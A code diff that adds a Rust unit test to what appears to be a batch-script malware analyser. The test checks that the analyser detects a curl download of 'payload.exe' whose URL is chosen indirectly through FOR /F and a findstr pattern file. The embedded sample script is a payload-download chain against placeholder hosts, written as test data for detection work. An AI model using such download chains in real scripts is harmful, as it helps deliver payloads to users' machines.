@@ -3745,6 +3745,43 @@ for /f "tokens=* delims=" %%U in ('findstr /i "https://" first.txt second.txt') 
     }
 
     #[test]
+    fn for_f_findstr_g_pattern_file_filters_generated_file_source() {
+        let report = analyze(
+            br#"echo needle.example>patterns.txt
+echo https://other.example/payload.exe>web.txt
+echo https://needle.example/payload.exe>>web.txt
+for /f "tokens=* delims=" %%U in ('findstr /g:patterns.txt web.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://needle.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /g pattern source did not feed matching curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://other.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /g pattern source overmatched nonmatching URL: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_sort_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>urls.txt
